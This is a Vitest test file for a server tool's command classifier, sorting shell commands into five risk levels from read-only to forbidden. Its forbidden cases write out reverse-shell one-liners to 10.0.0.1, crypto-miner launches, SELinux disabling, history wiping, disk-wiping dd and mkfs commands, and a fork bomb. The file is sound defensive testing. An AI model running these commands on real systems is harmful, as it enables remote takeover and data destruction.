// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2024-2026 ServerPilot Contributors
import { describe, it, expect } from 'vitest';
import {
  classifyCommand,
  RiskLevel,
  RiskLevelSchema,
} from './command-classifier.js';

// ============================================================================
// RiskLevel enum & schema
// ============================================================================

describe('RiskLevel', () => {
  it('should define all 5 risk levels', () => {
    expect(RiskLevel.GREEN).toBe('green');
    expect(RiskLevel.YELLOW).toBe('yellow');
    expect(RiskLevel.RED).toBe('red');
    expect(RiskLevel.CRITICAL).toBe('critical');
    expect(RiskLevel.FORBIDDEN).toBe('forbidden');
  });

  it('should validate valid risk levels with Zod schema', () => {
    for (const level of ['green', 'yellow', 'red', 'critical', 'forbidden']) {
      expect(RiskLevelSchema.parse(level)).toBe(level);
    }
  });

  it('should reject invalid risk levels with Zod schema', () => {
    expect(() => RiskLevelSchema.parse('unknown')).toThrow();
    expect(() => RiskLevelSchema.parse('')).toThrow();
    expect(() => RiskLevelSchema.parse(42)).toThrow();
  });
});

// ============================================================================
// classifyCommand — GREEN level
// ============================================================================

describe('classifyCommand — GREEN (read-only)', () => {
  it.each([
    ['ls -la'], ['ls'], ['cat /etc/nginx/nginx.conf'],
    ['head -n 20 /var/log/syslog'], ['tail -f /var/log/syslog'],
    ['less /etc/hosts'], ['wc -l /etc/passwd'],
    ['tree /var/www'], ['diff file1 file2'],
    ['md5sum file.txt'], ['sha256sum file.txt'],
    ['readlink /usr/bin/python'], ['realpath ./file'],
    ['basename /path/to/file'], ['dirname /path/to/file'],
  ])('should classify "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['df -h'], ['free -m'], ['top -bn1'], ['ps aux'],
    ['uptime'], ['uname -a'], ['hostname'], ['whoami'],
    ['id'], ['date'], ['arch'], ['nproc'], ['lscpu'],
    ['lspci'], ['lsusb'], ['lsof'], ['vmstat'], ['iostat'],
    ['dmesg'], ['last'], ['w'], ['groups'], ['getent passwd'],
  ])('should classify system info "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['ping 8.8.8.8'], ['ping6 ::1'], ['dig google.com'],
    ['nslookup google.com'], ['host google.com'], ['netstat -tlnp'],
    ['ss -tlnp'], ['traceroute google.com'], ['tracepath google.com'],
    ['ifconfig'], ['ip addr show'], ['arp -a'], ['mtr google.com'],
  ])('should classify network diagnostic "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['systemctl status nginx'], ['systemctl is-active nginx'],
    ['systemctl is-enabled nginx'], ['systemctl list-units'],
    ['systemctl list-timers'], ['systemctl show nginx'],
    ['service nginx status'], ['journalctl -u nginx'],
  ])('should classify service query "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['docker ps'], ['docker images'], ['docker logs my-container'],
    ['docker inspect my-container'], ['docker info'], ['docker version'],
    ['docker stats'], ['docker top my-container'], ['docker port my-container'],
    ['docker diff my-container'], ['docker network ls'], ['docker volume ls'],
    ['docker compose ps'], ['docker compose logs'], ['docker compose config'],
  ])('should classify docker read-only "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['kubectl get pods'], ['kubectl describe pod my-pod'],
    ['kubectl logs my-pod'], ['kubectl top nodes'],
    ['kubectl cluster-info'],
  ])('should classify kubernetes read-only "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['nginx -t'], ['nginx -T'], ['apachectl -t'], ['httpd -t'],
  ])('should classify config test "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['find /var/log -name "*.log"'], ['grep -r "error" /var/log/'],
    ['egrep "pattern" file'], ['fgrep "string" file'],
    ['rg "pattern" /src'], ['ag "pattern" /src'],
    ['which node'], ['whereis nginx'], ['locate nginx.conf'], ['type ls'],
  ])('should classify search command "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['node --version'], ['npm -v'], ['python3 -V'],
    ['printenv'], ['env'], ['echo hello'], ['printf "hello"'],
  ])('should classify info command "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['apt list --installed'], ['apt show nginx'], ['apt search redis'],
    ['apt-cache search nginx'], ['apt-cache show nginx'],
    ['dpkg -l'], ['dpkg --list'], ['dpkg -s nginx'], ['dpkg -L nginx'],
    ['rpm -qa'], ['yum list'], ['yum info nginx'],
    ['dnf list'], ['dnf search nginx'],
    ['snap list'], ['brew list'], ['brew info nginx'],
  ])('should classify package query "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['lsblk'], ['mount'], ['du -sh /var'], ['findmnt'], ['blkid'],
  ])('should classify disk info "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['git status'], ['git log'], ['git diff'], ['git show HEAD'],
    ['git branch'], ['git remote'], ['git tag'], ['git stash list'],
  ])('should classify git read-only "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['crontab -l'], ['pgrep nginx'], ['pidof nginx'],
    ['ufw status'], ['iptables -L'], ['iptables --list'],
    ['openssl x509 -text -noout -in cert.pem'],
  ])('should classify query command "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['sensors'], ['lshw'], ['dmidecode'],
    ['terraform plan'], ['terraform show'], ['terraform validate'],
    ['helm list'], ['helm status my-release'], ['helm show chart nginx'],
    ['npm ls'], ['npm outdated'], ['npm audit'],
    ['pnpm ls'], ['pnpm outdated'],
    ['yarn list'], ['yarn audit'],
    ['systemd-analyze'], ['smartctl -a /dev/sda'],
    ['iftop'], ['nethogs'], ['bwm-ng'],
    ['zipinfo archive.zip'], ['tar tf archive.tar.gz'],
  ])('should classify new read-only "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });

  it.each([
    ['aws s3 ls my-bucket'], ['aws ec2 describe-instances'],
    ['aws ecs list-clusters'], ['aws lambda list-functions'],
    ['gcloud compute instances list'], ['gcloud config list'],
    ['az vm list'], ['az account show'], ['az group list'],
    ['podman ps'], ['podman images'], ['podman logs container'],
    ['podman inspect container'], ['podman info'], ['podman version'],
    ['redis-cli INFO'], ['redis-cli PING'],
    ['vault status'], ['vault kv get secret/data'],
    ['certbot certificates'],
    ['docker service ls'], ['docker service logs svc'],
    ['docker stack ls'], ['docker node ls'],
    ['virsh list'], ['virsh dominfo vm1'],
    ['ansible-inventory'],
  ])('should classify cloud/infra read-only "%s" as GREEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.GREEN);
  });
});

// ============================================================================
// classifyCommand — YELLOW level
// ============================================================================

describe('classifyCommand — YELLOW (installation)', () => {
  it.each([
    ['apt install nginx'], ['apt-get install nginx'],
    ['apt update'], ['apt-get update'],
    ['apt upgrade'], ['apt full-upgrade'], ['apt-get dist-upgrade'],
    ['yum install httpd'], ['yum update'],
    ['dnf install httpd'], ['dnf update'],
    ['pacman -S nginx'], ['pacman -Syu'],
    ['brew install nginx'], ['brew upgrade'], ['snap install nginx'],
  ])('should classify "%s" as YELLOW', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.YELLOW);
  });

  it.each([
    ['npm install express'], ['npm i express'], ['npm ci'],
    ['pnpm install'], ['pnpm add express'],
    ['yarn install'], ['yarn add express'],
    ['pip install flask'], ['pip3 install flask'], ['pipx install black'],
    ['gem install rails'], ['bundle install'],
    ['cargo install serde'], ['go install tool@latest'], ['go get github.com/pkg'],
  ])('should classify "%s" as YELLOW', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.YELLOW);
  });

  it.each([
    ['docker pull nginx:latest'], ['docker compose pull'],
    ['git clone https://github.com/user/repo.git'],
    ['curl -O https://example.com/file.tar.gz'],
    ['wget https://example.com/file.tar.gz'],
  ])('should classify "%s" as YELLOW', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.YELLOW);
  });

  it.each([
    ['tar xzf archive.tar.gz'], ['unzip file.zip'],
    ['gunzip file.gz'], ['bunzip2 file.bz2'],
    ['make'], ['cmake .'],
    ['npm run build'], ['pnpm build'], ['yarn build'],
    ['cargo build'], ['go build'],
    ['docker build -t myapp .'], ['docker compose build'],
    ['kubectl apply -f deploy.yaml'], ['kubectl create deployment nginx'],
  ])('should classify "%s" as YELLOW', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.YELLOW);
  });

  it.each([
    ['helm install my-release nginx/nginx'],
    ['helm upgrade my-release nginx/nginx'],
    ['terraform apply'],
    ['ansible-playbook deploy.yml'],
    ['docker push myrepo/myapp:latest'],
    ['npm publish'],
    ['pip install --upgrade flask'],
    ['pip3 install --upgrade requests'],
  ])('should classify "%s" as YELLOW', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.YELLOW);
  });

  it.each([
    ['composer install'], ['composer update'], ['composer require laravel/framework'],
    ['mvn clean'], ['mvn install'], ['mvn deploy'],
    ['gradle build'], ['gradle clean'], ['gradle publish'],
    ['podman build -t myapp .'], ['podman pull nginx'],
    ['aws ec2 run-instances --image-id ami-123'],
    ['gcloud compute instances create my-vm'],
    ['az vm create -n myvm -g rg1'],
    ['certbot certonly --nginx'], ['certbot renew'],
    ['dotnet build'], ['dotnet publish'],
    ['podman-compose up'], ['podman-compose build'],
  ])('should classify new infra/build "%s" as YELLOW', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.YELLOW);
  });
});

// ============================================================================
// classifyCommand — RED level
// ============================================================================

describe('classifyCommand — RED (modification)', () => {
  it.each([
    ['systemctl restart nginx'], ['systemctl stop nginx'],
    ['systemctl start nginx'], ['systemctl reload nginx'],
    ['systemctl enable nginx'], ['systemctl disable nginx'],
    ['service nginx restart'], ['service nginx stop'],
  ])('should classify "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['nginx -s reload'], ['nginx -s stop'], ['nginx -s quit'],
    ['apachectl restart'], ['apachectl graceful'],
  ])('should classify "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['docker stop my-container'], ['docker restart my-container'],
    ['docker start my-container'], ['docker kill my-container'],
    ['docker pause my-container'], ['docker exec -it my-container bash'],
    ['docker run -d nginx'],
    ['docker compose up -d'], ['docker compose down'],
    ['docker compose restart'], ['docker compose exec web bash'],
  ])('should classify "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['chmod 644 /var/www/html/index.html'], ['chown www-data:www-data /var/www'],
    ['chgrp www-data /var/www'], ['setfacl -m u:user:rw file'],
    ['sed -i "s/old/new/g" /etc/nginx/nginx.conf'],
    ['cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak'],
    ['mv /tmp/config.conf /etc/app/config.conf'],
    ['mkdir /opt/myapp'], ['touch /tmp/file'],
    ['ln -s /usr/bin/python3 /usr/bin/python'],
    ['tee /etc/apt/sources.list.d/custom.list'],
    ['patch -p1 < fix.patch'],
  ])('should classify "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['git push origin main'], ['git commit -m "message"'],
    ['git merge feature-branch'], ['git rebase main'],
    ['git reset HEAD~1'], ['git checkout feature'],
    ['git pull'], ['git stash'], ['git cherry-pick abc123'],
  ])('should classify git modification "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['crontab -e'], ['ufw allow 80'], ['ufw deny 22'],
    ['iptables -A INPUT -p tcp --dport 80 -j ACCEPT'],
    ['useradd john'], ['usermod -aG docker john'],
    ['groupadd developers'], ['passwd john'],
    ['kill 1234'], ['killall nginx'], ['pkill -f nginx'],
    ['kubectl scale deployment nginx --replicas=3'],
    ['kubectl edit deployment nginx'], ['kubectl exec -it pod -- bash'],
  ])('should classify "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['helm uninstall my-release'],
    ['helm rollback my-release 1'],
    ['terraform state mv aws_instance.a aws_instance.b'],
    ['ssh user@remote-host uptime'],
    ['rsync -avz /src/ /dst/'],
    ['export MY_VAR=value'],
    ['systemctl daemon-reload'],
    ['swapon /dev/sda2'],
    ['mkswap /dev/sda2'],
  ])('should classify "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it.each([
    ['podman stop my-container'], ['podman exec -it my-container bash'],
    ['podman run -d nginx'], ['podman restart my-container'],
    ['podman-compose down'], ['podman-compose restart'],
    ['aws ec2 stop-instances --instance-ids i-123'],
    ['aws s3 cp /local/file s3://bucket/key'],
    ['gcloud compute instances stop my-vm'],
    ['az vm stop -n myvm -g rg1'],
    ['virsh start my-vm'],
    ['composer remove laravel/framework'],
    ['docker service update my-svc --replicas 3'],
    ['docker service scale my-svc=3'],
    ['vault kv put secret/data key=value'],
    ['vault auth enable userpass'],
    ['logrotate -f /etc/logrotate.conf'],
    ['auditctl -a exit,always -F arch=b64'],
  ])('should classify new infra/management "%s" as RED', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.RED);
  });

  it('should classify unknown commands as RED by default', () => {
    const result = classifyCommand('some-unknown-command --flag');
    expect(result.riskLevel).toBe(RiskLevel.RED);
    expect(result.reason).toContain('Unknown command');
  });
});

// ============================================================================
// classifyCommand — CRITICAL level
// ============================================================================

describe('classifyCommand — CRITICAL (destructive)', () => {
  it.each([
    ['rm file.txt'], ['rm -r /tmp/old-dir'], ['rm -f /var/log/old.log'],
    ['rmdir /tmp/empty-dir'], ['shred /tmp/sensitive.txt'], ['unlink /tmp/file'],
  ])('should classify "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it.each([
    ['apt remove nginx'], ['apt purge nginx'],
    ['apt-get remove nginx'], ['apt-get purge nginx'],
    ['apt autoremove nginx'],
    ['yum remove httpd'], ['yum erase httpd'],
    ['dnf remove httpd'], ['dnf autoremove httpd'],
    ['pacman -R nginx'], ['brew uninstall nginx'], ['snap remove nginx'],
    ['npm uninstall express'], ['npm remove express'],
    ['pnpm remove express'], ['yarn remove express'],
    ['pip uninstall flask'], ['pip3 uninstall flask'],
  ])('should classify "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it.each([
    ['docker rm my-container'], ['docker rmi nginx:latest'],
    ['docker container rm my-container'], ['docker image rm nginx'],
    ['docker system prune'], ['docker volume rm my-vol'],
    ['docker network rm my-net'], ['docker volume prune'],
    ['docker image prune'], ['docker container prune'],
  ])('should classify "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it.each([
    ['DROP DATABASE mydb'], ['DROP TABLE users'],
    ['DROP VIEW my_view'], ['DROP SCHEMA public'],
    ['drop database mydb'], ['TRUNCATE TABLE logs'],
    ['DELETE FROM users WHERE id = 1'],
    ['ALTER TABLE users DROP COLUMN email'],
  ])('should classify SQL destructive "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it.each([
    ['userdel john'], ['groupdel developers'],
    ['mv /etc/nginx/nginx.conf /tmp/'], ['mv /boot/grub/grub.cfg /tmp/'],
    ['systemctl mask nginx'],
    ['mysqladmin drop mydb'], ['dropdb mydb'], ['dropuser john'],
    ['kubectl delete pod my-pod'],
    ['shutdown -h now'], ['reboot'], ['poweroff'], ['halt'],
    ['lvremove /dev/vg0/lv0'], ['vgremove vg0'], ['pvremove /dev/sda1'],
  ])('should classify "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it.each([
    ['rm -rf /home/user/.ssh/id_rsa'],
    ['rm /home/user/.gnupg/pubring.kbx'],
    ['umount -f /mnt/data'],
    ['umount -l /mnt/nfs'],
    ['truncate -s 0 /var/log/syslog'],
    ['terraform destroy'],
    ['git push origin main --force'],
    ['git push -f origin main'],
    ['rm /tmp/backup.sql'],
    ['rm /tmp/backup.sql.gz'],
  ])('should classify "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it.each([
    ['aws ec2 terminate-instances --instance-ids i-123'],
    ['aws rds delete-db-instance --db-instance-identifier mydb'],
    ['aws s3 rm s3://bucket/key'],
    ['gcloud compute instances delete my-vm'],
    ['gcloud sql instances delete mydb'],
    ['az vm delete -n myvm -g rg1'],
    ['az sql server delete -n myserver -g rg1'],
    ['redis-cli FLUSHALL'], ['redis-cli FLUSHDB'],
    ['podman rm my-container'], ['podman rmi myimage'],
    ['podman system prune'],
    ['mdadm --stop /dev/md0'], ['mdadm --remove /dev/md0'],
    ['certbot revoke --cert-path /etc/letsencrypt/live/cert.pem'],
    ['vault kv delete secret/data'],
    ['vault secrets disable secret/'],
    ['journalctl --vacuum-time=1d'],
    ['docker service rm my-svc'], ['docker stack rm my-stack'],
    ['docker secret rm my-secret'], ['docker config rm my-config'],
  ])('should classify new cloud/infra destructive "%s" as CRITICAL', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.CRITICAL);
  });
});

// ============================================================================
// classifyCommand — FORBIDDEN level
// ============================================================================

describe('classifyCommand — FORBIDDEN (prohibited)', () => {
  it.each([
    ['rm -rf /'], ['rm -rf /*'],
    ['rm -rf / --no-preserve-root'], ['rm -fr /'],
  ])('should classify "%s" as FORBIDDEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it.each([
    ['mkfs.ext4 /dev/sda1'], ['fdisk /dev/sda'],
    ['parted /dev/sda'], ['gdisk /dev/sda'],
  ])('should classify "%s" as FORBIDDEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it.each([
    ['dd if=/dev/zero of=/dev/sda'], ['dd if=/dev/random of=/dev/sdb bs=1M'],
    ['dd if=/dev/zero of=/dev/nvme0n1'], ['dd if=/dev/zero of=/dev/vda'],
  ])('should classify "%s" as FORBIDDEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it.each([
    [':(){ :|:& };:'], ['echo "data" > /dev/sda'],
    ['echo "data" > /dev/nvme0n1'],
    ['chmod -R 777 /'], ['chmod 777 /'],
    ['rm --no-preserve-root /'],
    ['wipefs /dev/sda'], ['blkdiscard /dev/sda'],
    ['insmod malicious.ko'], ['rmmod critical_module'],
    ['ip link delete eth0'], ['init 0'],
  ])('should classify "%s" as FORBIDDEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it.each([
    ['bash -i >&/dev/tcp/10.0.0.1/4242'],
    ['nc 10.0.0.1 4242 -e /bin/sh'],
    ['ncat 10.0.0.1 4242 -e /bin/bash'],
    ['socat TCP:10.0.0.1:4242 EXEC:/bin/sh'],
    ['xmrig --donate-level 1'],
    ['minerd -a cryptonight'],
    ['setenforce 0'],
    ['aa-teardown'],
    ['swapoff -a'],
    ['history -c'],
  ])('should classify security threat "%s" as FORBIDDEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it.each([
    ['aws s3 rb s3://my-bucket --force'],
    ['gcloud projects delete my-project'],
    ['az group delete -n my-rg'],
    ['virsh destroy my-vm'], ['virsh undefine my-vm'],
    ['nsenter --target 1 --mount --uts --ipc --net --pid'],
  ])('should classify new destructive "%s" as FORBIDDEN', (command) => {
    expect(classifyCommand(command).riskLevel).toBe(RiskLevel.FORBIDDEN);
  });

  it('should classify empty command as FORBIDDEN', () => {
    expect(classifyCommand('')).toHaveProperty('riskLevel', RiskLevel.FORBIDDEN);
    expect(classifyCommand('   ')).toHaveProperty('riskLevel', RiskLevel.FORBIDDEN);
  });
});
